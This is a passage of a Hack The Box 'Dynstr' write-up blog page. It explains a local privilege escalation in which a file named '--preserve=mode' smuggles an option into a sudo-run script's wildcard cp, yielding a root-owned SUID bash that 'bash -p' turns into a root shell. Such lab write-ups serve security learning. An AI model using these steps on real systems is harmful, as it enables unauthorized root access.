+<span class="nb">echo</span> <span class="s2">"[+] Running </span><span class="nv">$0</span><span class="s2"> to stage new configuration from </span><span class="nv">$PWD</span><span class="s2">."</span>
+<span class="k">if</span> <span class="o">[[</span> <span class="o">!</span> <span class="nt">-f</span> .version <span class="o">]]</span> <span class="p">;</span> <span class="k">then
+    </span><span class="nb">echo</span> <span class="s2">"[-] ERROR: Check versioning. Exiting."</span>
+    <span class="nb">exit </span>42
+<span class="k">fi
+if</span> <span class="o">[[</span> <span class="s2">"</span><span class="sb">`</span><span class="nb">cat</span> .version 2&gt;/dev/null<span class="sb">`</span><span class="s2">"</span> <span class="nt">-le</span> <span class="s2">"</span><span class="sb">`</span><span class="nb">cat</span> <span class="nv">$BINDMGR_DIR</span>/.version 2&gt;/dev/null<span class="sb">`</span><span class="s2">"</span> <span class="o">]]</span> <span class="p">;</span> <span class="k">then
+    </span><span class="nb">echo</span> <span class="s2">"[-] ERROR: Check versioning. Exiting."</span>
+    <span class="nb">exit </span>43
+<span class="k">fi</span>
+
+<span class="c"># Create config file that includes all files from named.bindmgr.</span>
+<span class="nb">echo</span> <span class="s2">"[+] Creating </span><span class="nv">$BINDMGR_CONF</span><span class="s2"> file."</span>
+<span class="nb">printf</span> <span class="s1">'// Automatically generated file. Do not modify manually.\n'</span> <span class="o">&gt;</span> <span class="nv">$BINDMGR_CONF</span>
+<span class="k">for </span>file <span class="k">in</span> <span class="k">*</span> <span class="p">;</span> <span class="k">do
+    </span><span class="nb">printf</span> <span class="s1">'include "/etc/bind/named.bindmgr/%s";\n'</span> <span class="s2">"</span><span class="nv">$file</span><span class="s2">"</span> <span class="o">&gt;&gt;</span> <span class="nv">$BINDMGR_CONF</span>
+<span class="k">done</span>
+
+<span class="c"># Stage new version of configuration files.</span>
+<span class="nb">echo</span> <span class="s2">"[+] Staging files to </span><span class="nv">$BINDMGR_DIR</span><span class="s2">."</span>
+<span class="nb">cp</span> .version <span class="k">*</span> /etc/bind/named.bindmgr/
+
+<span class="c"># Check generated configuration with named-checkconf.</span>
+<span class="nb">echo</span> <span class="s2">"[+] Checking staged configuration."</span>
+named-checkconf <span class="nv">$BINDMGR_CONF</span> <span class="o">&gt;</span>/dev/null
+<span class="k">if</span> <span class="o">[[</span> <span class="nv">$?</span> <span class="nt">-ne</span> 0 <span class="o">]]</span> <span class="p">;</span> <span class="k">then
+    </span><span class="nb">echo</span> <span class="s2">"[-] ERROR: The generated configuration is not valid. Please fix following errors: "</span>
+    named-checkconf <span class="nv">$BINDMGR_CONF</span> 2&gt;&amp;1 | indent
+    <span class="nb">exit </span>44
+<span class="k">else 
+    </span><span class="nb">echo</span> <span class="s2">"[+] Configuration successfully staged."</span>
+    <span class="c"># *** TODO *** Uncomment restart once we are live.</span>
+    <span class="c"># systemctl restart bind9</span>
+    <span class="k">if</span> <span class="o">[[</span> <span class="nv">$?</span> <span class="nt">-ne</span> 0 <span class="o">]]</span> <span class="p">;</span> <span class="k">then
+        </span><span class="nb">echo</span> <span class="s2">"[-] Restart of bind9 via systemctl failed. Please check logfile: "</span>
+        systemctl status bind9
+    <span class="k">else
+        </span><span class="nb">echo</span> <span class="s2">"[+] Restart of bind9 via systemctl succeeded."</span>
+    <span class="k">fi
+fi</span>
+</code></pre></div></div>
+
+<p>Examining this script, it seems to first check for a <code class="language-plaintext highlighter-rouge">.version</code> file in your current directory, then if it finds one, it will compare it to <code class="language-plaintext highlighter-rouge">/etc/bind/named.bindmgr/.version</code>. If the version is higher, it will copy everything from the current directory to <code class="language-plaintext highlighter-rouge">/etc/bind/named.bindmgr/</code></p>
+
+<p>The issue with this is the copy command</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cp</span> .version <span class="k">*</span> /etc/bind/named.bindmgr/
+</code></pre></div></div>
+
+<p>The <code class="language-plaintext highlighter-rouge">*</code> here will simply take everything from the current directory and expand it on the CLI, so if we create a file with a name that is actually a CLI argument for <code class="language-plaintext highlighter-rouge">cp</code>, that will get expanded and become an argument rather than a file. We can use this to our advantage to preserve permissions on a file that is being copied.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">cd</span> /tmp
+<span class="nv">$ </span><span class="nb">echo </span>1 <span class="o">&gt;</span> .version
+<span class="nv">$ </span><span class="nb">cp</span> /bin/bash <span class="nb">.</span>
+<span class="nv">$ </span><span class="nb">chmod</span> +s bash
+<span class="nv">$ </span><span class="nb">echo</span> <span class="o">&gt;</span> <span class="s1">'--preserve=mode'</span>
+</code></pre></div></div>
+
+<p>This will expand to the following command</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">cp</span> .version <span class="nt">--preserve</span><span class="o">=</span>mode bash /etc/bind/named.bindmgr/
+</code></pre></div></div>
+
+<p>And since we used <code class="language-plaintext highlighter-rouge">chmod +s bash</code>, the resulting file will be owned by <code class="language-plaintext highlighter-rouge">root</code> and will have the SUID bit set, allowing it to be executed as root. Using the following, we will execute this and make the copy.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo</span> /usr/local/bin/bindmgr.sh
+</code></pre></div></div>
+
+<p>Now we should have a <code class="language-plaintext highlighter-rouge">bash</code> as root with the SUID bit set</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-larth</span> /etc/bind/named.bindmgr
+total 1.2M
+<span class="nt">-rw-rw-r--</span> 1 root <span class="nb">bind    </span>2 Jun 18 08:30 .version
+<span class="nt">-rwsr-sr-x</span> 1 root <span class="nb">bind </span>1.2M Jun 18 08:30 bash
+drwxr-sr-x 3 root <span class="nb">bind </span>4.0K Jun 18 08:30 ..
+drwxr-sr-x 2 root <span class="nb">bind </span>4.0K Jun 18 08:30 <span class="nb">.</span>
+</code></pre></div></div>
+
+<p>Great! Lets give it a try and execute this bash, but before we do we must look at the bash manual, specifically this portion:</p>
+
+<blockquote>
+  <p>If the shell is started with the effective user (group) id not equal to the real user (group) id, and the -p option is not supplied, no startup files are read, shell functions are not  inherited  from  the  environment,  the SHELLOPTS,  BASHOPTS,  CDPATH, and GLOBIGNORE variables, if they appear in the environment, are ignored, and the effective user id is set to the real user id.  If the -p option is supplied at invocation, the startup behavior is the same, but the effective user id is not reset.</p>
+</blockquote>
+
+<p>So, if we just execute the bash, it will detect that the effective user (<code class="language-plaintext highlighter-rouge">root</code>) differs from the real user (<code class="language-plaintext highlighter-rouge">bindmgr</code>) and will set the effective user to the real user, causing it to execute as <code class="language-plaintext highlighter-rouge">bindmgr</code> and not <code class="language-plaintext highlighter-rouge">root</code>. So we need to pass the <code class="language-plaintext highlighter-rouge">-p</code> option to prevent this from happening.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>/etc/bind/named.bindmgr/bash <span class="nt">-p</span>
+bash-5.0# <span class="nb">whoami
+</span>root
+bash-5.0#
+</code></pre></div></div>
+
+<p>Success!!!! We are now root!</p>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      <a href="/tags/#htb" class="page__taxonomy-item p-category" rel="tag">htb</a><span class="sep">, </span>
+    
+      <a href="/tags/#htb-medium" class="page__taxonomy-item p-category" rel="tag">htb medium</a><span class="sep">, </span>
+    
+      <a href="/tags/#offsec" class="page__taxonomy-item p-category" rel="tag">offsec</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      <a href="/categories/#blog" class="page__taxonomy-item p-category" rel="tag">blog</a><span class="sep">, </span>
+    
+      <a href="/categories/#htb" class="page__taxonomy-item p-category" rel="tag">htb</a><span class="sep">, </span>
+    
+      <a href="/categories/#writeup" class="page__taxonomy-item p-category" rel="tag">writeup</a>
+    
+    </span>
+  </p>
+
+
+        
+
+  <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time class="dt-published" datetime="2021-06-17T23:36:00-07:00">June 17, 2021</time></p>
+
+      </footer>
+
+      <section class="page__share">
+  
+
+  <a href="https://twitter.com/intent/tweet?text=HTB%3A+Dynstr+Writeup%20%2Fblog%2Fwriteup%2Fhtb%2Fhtb-dynstr%2F" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i><span> Twitter</span></a>
+
+  <a href="https://www.facebook.com/sharer/sharer.php?u=%2Fblog%2Fwriteup%2Fhtb%2Fhtb-dynstr%2F" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i><span> Facebook</span></a>
+
+  <a href="https://www.linkedin.com/shareArticle?mini=true&url=%2Fblog%2Fwriteup%2Fhtb%2Fhtb-dynstr%2F" class="btn btn--linkedin" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on LinkedIn"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span> LinkedIn</span></a>
+</section>
+
+
+      
+  <nav class="pagination">
+    
+      <a href="/blog/writeup/htb/htb-knife/" class="pagination--pager" title="HTB: Knife Writeup
+">Previous</a>
+    
+    
+      <a href="/blog/writeup/htb/htb-trick/" class="pagination--pager" title="HTB: Trick Writeup
+">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+  
+    <div class="page__related">
+      <h2 class="page__related-title">You May Also Enjoy</h2>
+      <div class="grid__wrapper">
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+        <a href="/blog/writeup/htb/htb-trick/" rel="permalink">HTB: Trick Writeup
+</a>
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+
+    
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-clock" aria-hidden="true"></i>
+        
+          6 minute read
+        
+      </span>
+    
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">There are spoilers below for the Hack The Box box named Trick. Stop reading here if you do not want spoilers!!!
+
+</p>
+  </article>
+</div>
+
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+        <a href="/blog/writeup/htb/htb-knife/" rel="permalink">HTB: Knife Writeup
+</a>
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+
+    
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-clock" aria-hidden="true"></i>
+        
+          2 minute read
+        
+      </span>
+    
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">There are spoilers below for the Hack The Box box named Cap. Stop reading here if you do not want spoilers!!!
+
+</p>
+  </article>
+</div>
+
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+        <a href="/blog/writeup/htb/htb-tenet/" rel="permalink">HTB: Tenet Writeup
+</a>
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+
+    
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-clock" aria-hidden="true"></i>
+        
+          5 minute read
+        
+      </span>
+    
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">There are spoilers below for the Hack The Box box named Cap. Stop reading here if you do not want spoilers!!!
+
+</p>
+  </article>
+</div>
+
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+        <a href="/blog/writeup/htb/htb-love/" rel="permalink">HTB: Love Writeup
+</a>
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+
+    
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-clock" aria-hidden="true"></i>
+        
+          4 minute read
+        
+      </span>
+    
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">There are spoilers below for the Hack The Box box named Cap. Stop reading here if you do not want spoilers!!!
+
+</p>
+  </article>
+</div>
+
+        
+      </div>
+    </div>
+  
+  
+</div>
+
+    </div>
+
+    
+      <div class="search-content">
+        <div class="search-content__inner-wrap"><form class="search-content__form" onkeydown="return event.key != 'Enter';" role="search">
+    <label class="sr-only" for="search">
+      Enter your search term...
+    </label>
+    <input type="search" id="search" class="search-input" tabindex="-1" placeholder="Enter your search term..." />
+  </form>
+  <div id="results" class="results"></div></div>
+
+      </div>
+    
+
+    <div id="footer" class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+
+    
+      
+        
+          <li><a href="https://github.com/alexloney" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub</a></li>
+        
+      
+    
+
+    
+      <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+    
+  </ul>
+</div>
+
+<div class="page__footer-copyright">&copy; 2022 Alex Loney. Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/minimal-mistakes-jekyll-theme/" rel="nofollow">Minimal Mistakes</a>.</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+
+
+
+
+<script src="/assets/js/lunr/lunr.min.js"></script>
+<script src="/assets/js/lunr/lunr-store.js"></script>
+<script src="/assets/js/lunr/lunr-en.js"></script>
+
+
+
+
+
+
+
+  </body>
+</html>
